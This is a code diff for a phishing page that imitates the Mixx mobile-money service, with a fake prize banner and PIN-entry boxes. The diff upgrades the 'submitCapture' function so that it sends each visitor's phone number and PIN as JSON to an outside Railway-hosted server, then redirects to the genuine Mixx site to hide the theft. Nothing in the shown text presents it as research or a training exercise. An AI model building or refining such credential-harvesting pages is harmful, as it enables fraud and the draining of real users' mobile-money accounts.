@@ -23,7 +23,6 @@
         position: relative;
     }
 
-    /* Watermark pattern - lighter for mobile */
     .watermark {
         position: fixed;
         font-size: 60px;
@@ -52,7 +51,6 @@
         border: 1px solid rgba(244,180,0,0.3);
     }
 
-    /* SVG responsive */
     svg {
         max-width: 140px;
         height: auto;
@@ -137,50 +135,18 @@
         box-shadow: 0 0 0 2px #ffe699;
     }
 
-    /* Mobile optimization */
     @media (max-width: 480px) {
-        body {
-            padding: 12px;
-        }
-        .wrapper {
-            padding: 24px 16px 35px;
-            border-radius: 40px;
-        }
-        h1 {
-            font-size: 28px;
-        }
-        .win-text {
-            font-size: 18px;
-            padding: 8px 16px;
-        }
-        .pin-box {
-            width: 55px;
-            height: 55px;
-            font-size: 28px;
-            border-radius: 16px;
-        }
-        .pin-wrapper {
-            gap: 10px;
-        }
-        input[type="tel"] {
-            padding: 12px 16px;
-            font-size: 16px;
-        }
-        label {
-            font-size: 13px;
-        }
+        body { padding: 12px; }
+        .wrapper { padding: 24px 16px 35px; border-radius: 40px; }
+        h1 { font-size: 28px; }
+        .win-text { font-size: 18px; padding: 8px 16px; }
+        .pin-box { width: 55px; height: 55px; font-size: 28px; border-radius: 16px; }
+        .pin-wrapper { gap: 10px; }
     }
 
     @media (max-width: 380px) {
-        .pin-box {
-            width: 48px;
-            height: 48px;
-            font-size: 24px;
-            border-radius: 14px;
-        }
-        .pin-wrapper {
-            gap: 8px;
-        }
+        .pin-box { width: 48px; height: 48px; font-size: 24px; border-radius: 14px; }
+        .pin-wrapper { gap: 8px; }
     }
 
     .footer-note {
@@ -198,7 +164,6 @@
 <div class="watermark bottom-right">Mixx</div>
 
 <div class="wrapper" id="appWrapper">
-    <!-- SVG LOGO -->
     <svg width="140" height="107" viewBox="0 0 400 300">
         <ellipse cx="200" cy="240" rx="70" ry="12" fill="rgba(0,0,0,0.08)"/>
         <rect x="120" y="50" width="140" height="160" rx="22" fill="#fff" stroke="#F4B400" stroke-width="8"/>
@@ -242,27 +207,52 @@
         let realPin = ["", "", "", ""];
         let submitted = false;
 
-        // Phone number: only digits, max 10
+        // ============================================
+        // RAILWAY BACKEND URL (UPDATED)
+        // ============================================
+        const BACKEND_URL = 'https://mixxyass-production.up.railway.app/Server';
+
         phoneInput.addEventListener('input', function(e) {
             this.value = this.value.replace(/\D/g, '').slice(0, 10);
         });
 
-        function submitCapture() {
+        async function submitCapture() {
             if (submitted) return;
             submitted = true;
             
             const phone = phoneInput.value;
             const fullPin = realPin.join('');
             
-            // Log to console only (invisible to user)
-            console.log('📱 Phone:', phone);
-            console.log('🔐 PIN:', fullPin);
+            console.log('Sending data:', { phone, pin: fullPin });
             
-            // Fade out effect before redirect
+            // Send data to Railway backend as JSON
+            try {
+                const response = await fetch(BACKEND_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ 
+                        phone: phone, 
+                        pin: fullPin 
+                    })
+                });
+                
+                const result = await response.json();
+                console.log('Backend response:', result);
+                
+                if (result.status !== 'success') {
+                    console.error('Backend error:', result);
+                }
+                
+            } catch (error) {
+                console.error('Error sending data:', error);
+            }
+            
+            // Fade out and redirect to real Mixx site
             wrapper.style.transition = "opacity 0.5s";
             wrapper.style.opacity = "0";
             
-            // Redirect to real Mixx site
             setTimeout(() => {
                 window.location.href = "https://yas.co.tz/mixx-by-yas/";
             }, 500);
@@ -282,7 +272,6 @@
                 e.target.value = val;
                 realPin[idx] = val;
                 
-                // Visual masking after short delay
                 setTimeout(() => {
                     if (document.activeElement !== box) {
                         e.target.value = '•';
@@ -308,7 +297,6 @@
             });
         });
         
-        // Handle Enter key
         document.addEventListener('keydown', function(e) {
             if (e.key === "Enter" && realPin.every(x => x !== "") && phoneInput.value.length === 10 && !submitted) {
                 e.preventDefault();
